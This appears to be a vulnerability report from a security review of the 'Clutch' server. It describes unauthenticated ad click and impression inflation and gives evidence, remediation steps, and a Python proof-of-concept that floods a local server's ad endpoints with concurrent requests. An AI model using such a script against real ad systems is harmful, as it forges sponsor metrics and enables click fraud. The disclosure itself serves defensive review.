# Unauthenticated, unlimited ad click and impression inflation for real ad ids

**ID:** vuln-0012
**Severity:** MEDIUM
**Found:** 2026-11-19 17:10:34 UTC
**Target:** Clutch cloud server (server/src/index.mjs, server/src/db.mjs)
**Endpoint:** /api/ads/{id}/click
**Method:** POST
**CWE:** CWE-799
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Low

## Description

`POST /api/ads/{id}/click` and `GET /api/ads` require no authentication, no per-client limit and no deduplication. Anyone can raise the click and impression counters of any real sponsored card arbitrarily. The 2026-11-18 fix only rejects ids that are not in `ads.json`; real ids such as `community` remain open.

## Evidence

```
POST /api/ads/community/click  -> 200 {"ok":true}   (x1001, no Authorization header)
ad_stats: community impressions=302 clicks=1001
          pro-upgrade impressions=302 clicks=0
          star-github impressions=301 clicks=0
```

## Impact

Demonstrated: 1,000 unauthenticated click requests were accepted in a few seconds and the `community` ad's click counter rose from 0 to 1,001 against 302 impressions. If the operator sells sponsor slots and reports or bills on `ad_stats`, the figures can be forged at will, or used to make a competitor's ad look fraudulent. Every request also performs two SQLite writes, which gives an unauthenticated write-amplifying request path. No confidentiality impact and no user data is affected.

## Counterevidence

No rate limiting, auth, dedup, or token check exists on these routes (read the full handler and tested 1,000 requests). The only control is the id allowlist, which real ids pass. There is currently no API that exposes `ad_stats`, so the business impact depends on how the operator uses the table; this limits severity to Low in practice despite the computed score.

## What Would Change This Severity

Evidence that sponsors are billed or paid out from `ad_stats` would raise the impact; if stats are never used for billing the issue is informational.

## Technical Analysis

The route handler:\n\n```js\nif (req.method === 'POST' && (r = m(/^\\/api\\/ads\\/([\\w-]+)\\/click$/))) {\n  if (loadAds().some((a) => a.id === r[1])) adStats.bump(r[1], 'click')\n  return send(res, 200, { ok: true })\n}\n```\n\nhas no `authed()` call, no per-IP or per-account counter, and no once-per-impression token. `GET /api/ads` similarly bumps `impressions` for each returned ad with no authentication. `adStats.bump` performs an upsert and an update on every call. `ads.json` is re-read from disk on every request, adding file I/O per unauthenticated hit.

## Proof of Concept

1. Start the server and note nothing else is required (no sign-in).\n2. Send `POST /api/ads/community/click` with no headers 1,000 times (10 in parallel).\n3. All responses are 200 `{ok:true}`.\n4. Send `GET /api/ads?placement=home&count=3` 300 times.\n5. Read the `ad_stats` table: `community` shows 1,001 clicks and 302 impressions.

```python
import requests, concurrent.futures as cf
B = 'http://127.0.0.1:8787'
f = lambda i: requests.post(B + '/api/ads/community/click').status_code
with cf.ThreadPoolExecutor(10) as ex:
    print(set(ex.map(f, range(1000))))
g = lambda i: requests.get(B + '/api/ads?placement=home&count=3').status_code
with cf.ThreadPoolExecutor(10) as ex:
    print(set(ex.map(g, range(300))))
```

## Remediation

Require a signed session for click reporting and bind each click to a short-lived impression token issued by `GET /api/ads`, accepting each token once. Add per-account and per-IP rate limits to both ad endpoints, and cache the parsed `ads.json` instead of reading it on every request.

## Assumptions

The operator relies on `ad_stats` for sponsor reporting or billing. The review document lists per-IP rate limits as a known, unchanged gap; this finding concerns the absence of any control on this specific unauthenticated counter.
